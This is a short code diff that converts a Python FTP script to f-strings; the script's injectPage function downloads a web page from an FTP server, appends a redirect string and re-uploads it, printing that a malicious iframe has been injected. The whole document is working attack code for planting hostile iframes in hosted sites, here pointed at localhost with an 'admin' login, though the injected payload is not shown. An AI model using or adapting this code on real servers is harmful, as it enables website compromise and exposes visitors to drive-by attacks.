@@ -1,16 +1,16 @@
 import ftplib
 
 def injectPage(ftp, page, redirect):
-    f = open(page + '.tmp', 'w')
-    ftp.retrlines('RETR' + page, f.write)
-    print('[+] Download Page: ' + page)
+    f = open(f'{page}.tmp', 'w')
+    ftp.retrlines(f'RETR {page}', f.write)
+    print(f'[+] Download Page: {page}')
 
     f.write(redirect)
     f.close()
-    print('[+] Injected Malicious IFrame on: ' + page)
+    print(f'[+] Injected Malicious IFrame on: {page}')
 
-    ftp.storlines('STOR ' + page, open(page + '.tmp'))
-    print('[+] Uploaded Injected Page: ' + page)
+    ftp.storlines(f'STOR {page}', open(f'{page}.tmp'))
+    print(f'[+] Uploaded Injected Page: {page}')
 
 host = '127.0.0.1'
 username = 'admin'
